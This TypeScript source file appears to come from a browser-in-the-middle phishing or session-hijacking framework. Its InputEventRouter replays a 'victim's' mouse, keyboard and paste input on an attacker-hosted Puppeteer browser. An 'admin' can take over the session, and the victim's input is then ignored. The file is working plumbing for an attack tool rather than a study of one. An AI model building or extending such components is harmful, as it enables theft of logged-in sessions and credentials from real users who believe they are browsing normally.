import type { InputEvent, MouseEventData, KeyboardEventData, WheelEventData } from '../../shared/types/events.js';
import type { BrowserInstance } from '../../shared/types/browser.js';
import { SessionManager } from './SessionManager.js';
import { BrowserPoolManager } from './BrowserPoolManager.js';
import { logger } from '../utils/logger.js';

export class InputEventRouter {
  private eventQueues: Map<string, InputEvent[]> = new Map();
  private processing: Map<string, boolean> = new Map();

  constructor(
    private sessionManager: SessionManager,
    private browserPoolManager: BrowserPoolManager
  ) {}

  /**
   * Route an input event to the appropriate browser
   */
  async routeEvent(event: InputEvent): Promise<void> {
    // Log non-mousemove events
    if (event.type !== 'mousemove') {
      logger.info(`Input event received: ${event.type} for session ${event.sessionId}`);
    }

    const session = this.sessionManager.getSession(event.sessionId);
    if (!session) {
      logger.warn(`Session ${event.sessionId} not found for input event`);
      return;
    }

    // Check if admin has control
    if (session.status === 'admin-controlled' && !session.adminSocketId) {
      // Admin control was released but status wasn't updated
      session.status = 'active';
    }

    // Ignore victim input when admin is controlling
    if (session.status === 'admin-controlled') {
      logger.debug(`Ignoring victim input for session ${event.sessionId} (admin controlled)`);
      return;
    }

    // Add to queue for processing
    if (!this.eventQueues.has(event.sessionId)) {
      this.eventQueues.set(event.sessionId, []);
    }
    this.eventQueues.get(event.sessionId)!.push(event);

    // Process queue if not already processing
    if (!this.processing.get(event.sessionId)) {
      this.processQueue(event.sessionId);
    }
  }

  /**
   * Process event queue for a session
   */
  private async processQueue(sessionId: string): Promise<void> {
    this.processing.set(sessionId, true);

    try {
      while (this.eventQueues.has(sessionId) && this.eventQueues.get(sessionId)!.length > 0) {
        const event = this.eventQueues.get(sessionId)!.shift()!;
        await this.executeEvent(event);

        // Throttle high-frequency events (mousemove)
        if (event.type === 'mousemove') {
          await this.delay(16); // ~60fps
        }
      }
    } catch (error) {
      logger.error(`Error processing event queue for session ${sessionId}:`, error);
    } finally {
      this.processing.set(sessionId, false);
    }
  }

  /**
   * Execute an input event on the browser
   */
  private async executeEvent(event: InputEvent): Promise<void> {
    const session = this.sessionManager.getSession(event.sessionId);
    if (!session || !session.browserId) {
      return;
    }

    const browser = this.browserPoolManager.getBrowser(session.browserId);
    if (!browser) {
      logger.warn(`Browser ${session.browserId} not found for session ${event.sessionId}`);
      return;
    }

    try {
      switch (event.type) {
        case 'mousedown':
        case 'mouseup':
        case 'click':
          await this.handleMouseEvent(browser, event);
          break;
        case 'mousemove':
          await this.handleMouseMove(browser, event);
          break;
        case 'mousewheel':
          await this.handleWheelEvent(browser, event);
          break;
        case 'keydown':
        case 'keyup':
          await this.handleKeyboardEvent(browser, event);
          break;
        case 'paste':
          await this.handlePasteEvent(browser, event);
          break;
        default:
          logger.warn(`Unknown event type: ${event.type}`);
      }

      // Update session activity
      await this.sessionManager.updateActivity(event.sessionId);
    } catch (error) {
      logger.error(`Error executing event ${event.type} for session ${event.sessionId}:`, error);
    }
  }

  /**
   * Handle mouse events (click, mousedown, mouseup)
   */
  private async handleMouseEvent(browser: BrowserInstance, event: InputEvent): Promise<void> {
    const data = event.data as MouseEventData;
    const page = browser.targetPage;

    // Coordinates are already mapped to browser viewport by client
    const x = data.clientX;
    const y = data.clientY;

    // Parse button - handle both numeric and string formats
    let button: 'left' | 'right' | 'middle' = 'left';
    if (data.button === 2 || data.button === 'right') button = 'right';
    else if (data.button === 1 || data.button === 'middle') button = 'middle';

    logger.debug(`Mouse ${event.type} at (${x}, ${y}), button: ${button}`);

    switch (event.type) {
      case 'mousedown':
        await page.mouse.move(x, y);
        await page.mouse.down({ button });
        break;
      case 'mouseup':
        await page.mouse.up({ button });
        break;
      case 'click':
        await page.mouse.click(x, y, { button });
        logger.info(`Clicked at (${x}, ${y})`);
        break;
    }
  }

  /**
   * Handle mouse move events (throttled)
   */
  private async handleMouseMove(browser: BrowserInstance, event: InputEvent): Promise<void> {
    const data = event.data as MouseEventData;
    const page = browser.targetPage;

    // Coordinates are already mapped to browser viewport by client
    await page.mouse.move(data.clientX, data.clientY);
  }

  /**
   * Handle mouse wheel events
   */
  private async handleWheelEvent(browser: BrowserInstance, event: InputEvent): Promise<void> {
    const data = event.data as WheelEventData;
    const page = browser.targetPage;

    // Puppeteer mouse.wheel() takes deltaY only, or we can use deltaX/deltaY separately
    if (data.deltaY) {
      await page.mouse.wheel({ deltaY: data.deltaY });
    }
    if (data.deltaX) {
      // For horizontal scrolling, we'd need to use evaluate or CDP
      await page.evaluate((deltaX) => {
        // @ts-ignore - browser context
        window.scrollBy(deltaX, 0);
      }, data.deltaX);
    }
  }

  /**
   * Handle keyboard events
   */
  private async handleKeyboardEvent(browser: BrowserInstance, event: InputEvent): Promise<void> {
    const data = event.data as KeyboardEventData;
    const page = browser.targetPage;

    if (event.type === 'keydown') {
      // Handle special keys
      if (data.key === 'Enter') {
        await page.keyboard.press('Enter');
      } else if (data.key === 'Tab') {
        await page.keyboard.press('Tab');
      } else if (data.key === 'Backspace') {
        await page.keyboard.press('Backspace');
      } else if (data.key === 'Escape') {
        await page.keyboard.press('Escape');
      } else if (data.key.length === 1) {
        // Regular character
        const options: { shift?: boolean; ctrl?: boolean; alt?: boolean; meta?: boolean } = {};
        if (data.shiftKey) options.shift = true;
        if (data.ctrlKey) options.ctrl = true;
        if (data.altKey) options.alt = true;
        if (data.metaKey) options.meta = true;

        await page.keyboard.type(data.key, { delay: 0 });
      }
    }
    // keyup events are typically not needed for Puppeteer
  }

  /**
   * Handle paste events
   */
  private async handlePasteEvent(browser: BrowserInstance, _event: InputEvent): Promise<void> {
    const page = browser.targetPage;

    // Focus on the page first
    await page.bringToFront();

    // Use keyboard shortcut to paste (simpler and more reliable)
    // Note: The paste data should already be in clipboard from client side
    await page.keyboard.down('Control');
    await page.keyboard.press('v');
    await page.keyboard.up('Control');
  }

  /**
   * Delay helper
   */
  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
}

